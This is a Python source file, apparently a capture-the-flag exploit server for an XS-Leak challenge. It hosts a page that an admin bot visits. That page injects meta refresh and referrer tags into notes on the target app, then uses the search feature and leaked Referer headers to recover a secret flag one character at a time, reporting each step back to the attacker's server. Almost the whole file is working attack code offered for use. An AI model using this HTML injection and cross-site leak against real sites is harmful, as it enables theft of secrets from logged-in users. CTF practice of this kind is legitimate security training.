#!/usr/bin/env python3

import argparse
import ssl
import subprocess
import sys
import tempfile
import threading
import time
import urllib.parse
import urllib.request
from pathlib import Path

from flask import Flask, Response, render_template_string, request


EXPLOIT_PAGE = """<!doctype html>
<html lang="en">
<body>
    <form method="post" target="p">
        <input type="text" name="content">
    </form>
    <script>
        const TARGET = {{ target_url | tojson }};
        const REDIRECTED_URL = `${location.origin}/set-referer`;
        const PREFIX = {{ known_prefix | tojson }};
        const CHARS = {{ alphabet | tojson }};
        const ATTEMPTS = {{ attempts | tojson }};
        const DELAY_MS = {{ delay_ms | tojson }};
        const START_DELAY_MS = {{ start_delay_ms | tojson }};
        const form = document.querySelector("form");
        const input = document.querySelector("input");

        form.action = `${TARGET}/create-note`;

        function sleep(ms) {
            return new Promise((resolve) => setTimeout(resolve, ms));
        }

        async function getReferer() {
            const response = await fetch("/get-referer", { cache: "no-store" });
            if (!response.ok) {
                throw new Error(`get-referer failed with ${response.status}`);
            }
            return await response.text();
        }

        function createNote(value) {
            input.value = value;
            form.submit();
        }

        async function getNoteId(value) {
            open(`${TARGET}/search-notes?query=view:${encodeURIComponent(value)}`, "p");
            return await getReferer();
        }

        async function leak(known) {
            const prefix = "*" + ["@", ...CHARS].map((c) => known + c).join("|");
            for (let i = 0; i < ATTEMPTS; i++) {
                createNote(
                    `${prefix}<meta name="referrer" content="unsafe-url"><meta http-equiv="Refresh" content="0; URL=${REDIRECTED_URL}">`
                );
                await sleep(DELAY_MS);
            }

            const baseline = await getNoteId(known + "@");
            for (const candidate of CHARS) {
                const current = await getNoteId(known + candidate);
                if (baseline !== current) {
                    return known + candidate;
                }
            }
            throw new Error("character not found");
        }

        async function main() {
            let known = PREFIX;
            while (!known.endsWith("}")) {
                known = await leak(known);
                await fetch(`/progress?flag=${encodeURIComponent(known)}`, { cache: "no-store" });
            }
            await fetch(`/progress?flag=${encodeURIComponent(known)}`, { cache: "no-store" });
        }

        function runExploit() {
            main().catch(async (error) => {
                console.error(error);
                await fetch(`/progress?error=${encodeURIComponent(String(error))}`, { cache: "no-store" });
            });
        }

        window.addEventListener("load", () => {
            setTimeout(runExploit, START_DELAY_MS);
        });
    </script>
</body>
</html>
"""


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="HTTPS helper for the my imaginary dream XS-Leak challenge"
    )
    parser.add_argument(
        "--target-url",
        default="https://localhost:8080",
        help="Base URL of the vulnerable app, e.g. https://challenge.host:PORT",
    )
    parser.add_argument(
        "--bind-host",
        default="0.0.0.0",
        help="Local interface to bind the Flask server to",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=4444,
        help="Local HTTPS port to listen on",
    )
    parser.add_argument(
        "--domain",
        help="Public hostname for this exploit server, e.g. attack.1pc.tf",
    )
    parser.add_argument(
        "--public-url",
        help="Full public URL to hand to the bot, e.g. https://attack.1pc.tf/",
    )
    parser.add_argument(
        "--report-url",
        help="Optional admin bot endpoint. If omitted, --submit derives it from --target-url as /report/",
    )
    parser.add_argument(
        "--report-timeout",
        type=float,
        default=120.0,
        help="Seconds to wait for /report/ response before giving up.",
    )
    parser.add_argument(
        "--submit",
        action="store_true",
        help="Automatically POST the public URL to the report endpoint after startup",
    )
    parser.add_argument(
        "--known-prefix",
        default="FindITCTF{",
        help="Known flag prefix",
    )
    parser.add_argument(
        "--alphabet",
        default="}_abcdefghijklmnopqrstuvwxyz1234567890",
        help="Character order used by the oracle",
    )
    parser.add_argument(
        "--attempts",
        type=int,
        default=12,
        help="How many duplicate notes to create for each leak round",
    )
    parser.add_argument(
        "--delay-ms",
        type=int,
        default=200,
        help="Delay between note creations in milliseconds",
    )
    parser.add_argument(
        "--start-delay-ms",
        type=int,
        default=2000,
        help="Delay before starting the exploit so the bot's initial page load can go idle",
    )
    parser.add_argument(
        "--referer-timeout",
        type=float,
        default=15.0,
        help="Seconds to wait for the redirected referer",
    )
    parser.add_argument(
        "--cert",
        help="Path to an existing TLS certificate PEM file",
    )
    parser.add_argument(
        "--key",
        help="Path to an existing TLS private key PEM file",
    )
    parser.add_argument(
        "--http",
        action="store_true",
        help="Serve plain HTTP instead of HTTPS. Use this behind Traefik or another TLS terminator.",
    )
    return parser.parse_args()


def normalize_base_url(raw: str) -> str:
    value = raw.strip()
    if not value:
        raise ValueError("empty URL")
    if "://" not in value:
        value = f"https://{value}"
    return value.rstrip("/")


def build_public_url(args: argparse.Namespace) -> str | None:
    if args.public_url:
        return normalize_base_url(args.public_url) + "/"
    if not args.domain:
        return None
    host = args.domain.strip()
    if not host:
        return None
    if args.port == 443:
        return f"https://{host}/"
    return f"https://{host}:{args.port}/"


def derive_report_url(target_url: str, explicit: str | None) -> str:
    if explicit:
        return normalize_base_url(explicit) + "/"
    return normalize_base_url(target_url) + "/report/"


def create_self_signed_cert(hostname: str) -> tuple[str, str, tempfile.TemporaryDirectory[str]]:
    temp_dir = tempfile.TemporaryDirectory(prefix="go-leak-cert-")
    cert_path = Path(temp_dir.name) / "cert.pem"
    key_path = Path(temp_dir.name) / "key.pem"
    config_path = Path(temp_dir.name) / "openssl.cnf"

    config_path.write_text(
        "\n".join(
            [
                "[req]",
                "default_bits = 2048",
                "prompt = no",
                "default_md = sha256",
                "distinguished_name = dn",
                "x509_extensions = v3_req",
                "",
                "[dn]",
                f"CN = {hostname}",
                "",
                "[v3_req]",
                "subjectAltName = @alt_names",
                "",
                "[alt_names]",
                f"DNS.1 = {hostname}",
                "",
            ]
        ),
        encoding="utf-8",
    )

    subprocess.run(
        [
            "openssl",
            "req",
            "-x509",
            "-nodes",
            "-newkey",
            "rsa:2048",
            "-days",
            "7",
            "-keyout",
            str(key_path),
            "-out",
            str(cert_path),
            "-config",
            str(config_path),
        ],
        check=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    return str(cert_path), str(key_path), temp_dir


class RefererState:
    def __init__(self) -> None:
        self._condition = threading.Condition()
        self._value: str | None = None

    def set(self, value: str) -> None:
        with self._condition:
            while self._value is not None:
                self._condition.wait(timeout=0.1)
            self._value = value
            self._condition.notify_all()

    def pop(self, timeout: float) -> str | None:
        deadline = time.monotonic() + timeout
        with self._condition:
            while self._value is None:
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    return None
                self._condition.wait(timeout=min(0.1, remaining))
            value = self._value
            self._value = None
            self._condition.notify_all()
            return value


def submit_to_bot(
    report_url: str, public_url: str, timeout_seconds: float
) -> tuple[int, str]:
    data = urllib.parse.urlencode({"url": public_url}).encode()
    request_obj = urllib.request.Request(
        report_url,
        data=data,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    ssl_context = ssl._create_unverified_context()
    with urllib.request.urlopen(
        request_obj, timeout=timeout_seconds, context=ssl_context
    ) as response:
        body = response.read().decode("utf-8", errors="replace")
        return response.status, body


def main() -> int:
    args = parse_args()
    try:
        target_url = normalize_base_url(args.target_url)
    except ValueError as exc:
        print(f"[!] invalid --target-url: {exc}", file=sys.stderr)
        return 1

    public_url = build_public_url(args)
    if args.submit and not public_url:
        print(
            "[!] --submit requires --public-url or --domain so the bot has a reachable URL",
            file=sys.stderr,
        )
        return 1

    if (args.cert and not args.key) or (args.key and not args.cert):
        print("[!] provide both --cert and --key together", file=sys.stderr)
        return 1

    temp_cert_dir: tempfile.TemporaryDirectory[str] | None = None
    ssl_context: str | tuple[str, str] | None
    if args.http:
        ssl_context = None
    elif args.cert and args.key:
        ssl_context = (args.cert, args.key)
    else:
        cert_host = args.domain or "localhost"
        try:
            cert_path, key_path, temp_cert_dir = create_self_signed_cert(cert_host)
        except FileNotFoundError:
            print(
                "[!] openssl was not found. Install it or pass --cert/--key.",
                file=sys.stderr,
            )
            return 1
        except subprocess.CalledProcessError:
            print("[!] failed to generate a self-signed certificate", file=sys.stderr)
            return 1
        ssl_context = (cert_path, key_path)

    referer_state = RefererState()
    latest_flag = {"value": args.known_prefix}

    app = Flask(__name__)

    @app.get("/")
    def home() -> Response | str:
        return render_template_string(
            EXPLOIT_PAGE,
            target_url=target_url,
            known_prefix=args.known_prefix,
            alphabet=args.alphabet,
            attempts=args.attempts,
            delay_ms=args.delay_ms,
            start_delay_ms=args.start_delay_ms,
        )

    @app.get("/progress")
    def progress() -> tuple[str, int]:
        flag = request.args.get("flag")
        error = request.args.get("error")
        if flag and flag != latest_flag["value"]:
            latest_flag["value"] = flag
            print(f"[+] progress: {flag}", flush=True)
        if error:
            print(f"[!] client error: {error}", flush=True)
        return "ok", 200

    @app.get("/set-referer")
    def set_referer() -> tuple[str, int]:
        referer = request.headers.get("Referer", "")
        if not referer:
            return "missing referer", 400
        referer_state.set(referer)
        return "ok", 200

    @app.get("/get-referer")
    def get_referer() -> tuple[str, int]:
        referer = referer_state.pop(args.referer_timeout)
        if referer is None:
            return "timeout", 504
        return referer, 200

    @app.get("/healthz")
    def healthz() -> tuple[str, int]:
        return "ok", 200

    scheme = "http" if args.http else "https"
    print(f"[+] target     : {target_url}", flush=True)
    print(f"[+] bind       : {scheme}://{args.bind_host}:{args.port}", flush=True)
    if public_url:
        print(f"[+] public URL : {public_url}", flush=True)
    else:
        print("[*] public URL : not set, pass --domain or --public-url", flush=True)

    if args.submit:
        report_url = derive_report_url(target_url, args.report_url)
        print(f"[+] report URL : {report_url}", flush=True)

        def delayed_submit() -> None:
            time.sleep(1.0)
            try:
                status, body = submit_to_bot(report_url, public_url, args.report_timeout)
            except Exception as exc:  # noqa: BLE001
                print(f"[!] report failed: {exc}", flush=True)
                return
            print(f"[+] report status: {status}", flush=True)
            print(f"[+] report body  : {body}", flush=True)

        threading.Thread(target=delayed_submit, daemon=True).start()

    try:
        app.run(
            host=args.bind_host,
            port=args.port,
            ssl_context=ssl_context,
            debug=False,
            threaded=True,
            use_reloader=False,
        )
    finally:
        if temp_cert_dir is not None:
            temp_cert_dir.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
